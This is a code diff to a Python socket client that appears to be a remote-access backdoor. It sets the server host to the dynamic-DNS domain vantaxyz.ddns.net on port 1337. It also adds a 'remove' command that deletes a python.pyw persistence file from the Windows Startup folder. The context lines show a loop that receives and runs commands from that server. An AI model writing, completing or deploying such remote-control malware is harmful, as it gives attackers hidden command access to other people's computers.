@@ -10,7 +10,7 @@ import shutil
 class Client(object):
 
     def __init__(self):
-        self.serverHost = 'host'
+        self.serverHost = 'vantaxyz.ddns.net'
         self.serverPort = 1337
         self.socket = None
 
@@ -78,6 +78,12 @@ class Client(object):
                     output_str = ""
             elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
+                break
+            elif data[:].decode("utf-8") == 'remove':
+                user = os.getlogin()
+                target = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/python.pyw"%user
+                os.remove(target)
+                exit()
                 break
             elif len(data) > 0:
                 try:
